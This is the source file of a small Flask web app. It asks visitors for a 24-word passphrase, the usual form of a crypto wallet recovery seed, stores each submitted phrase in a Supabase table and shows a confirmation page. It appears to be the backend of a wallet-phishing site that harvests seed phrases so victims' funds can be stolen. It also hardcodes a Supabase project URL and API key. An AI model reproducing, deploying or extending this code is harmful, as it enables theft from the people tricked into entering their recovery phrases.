from flask import Flask, render_template, request, redirect
from supabase import create_client, Client

app = Flask(__name__, static_folder='static', template_folder='.')

# Supabase credentials
SUPABASE_URL = "https://ixqiadgvovxozexatyta.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml4cWlhZGd2b3Z4b3pleGF0eXRhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDgxNjk5ODcsImV4cCI6MjA2Mzc0NTk4N30.yXPGI9RR_H4N9Ocp4FQGgh4ycDFRz9cfUEkX_PdTJos"

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/passphrase')
def passphrase():
    return render_template("passphrase.html")

@app.route('/submit-passphrase', methods=["POST"])
def submit_passphrase():
    passphrase = request.form.get("passphrase", "")
    words = passphrase.strip().split()
    if len(words) != 24:
        return "Invalid passphrase. It must be exactly 24 words.", 400

    # Save passphrase to Supabase
    data = {"phrase": passphrase.strip()}
    supabase.table("passphrases").insert(data).execute()

    return redirect("/confirmation")

@app.route('/confirmation')
def confirmation():
    return render_template("confirmation.html")

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
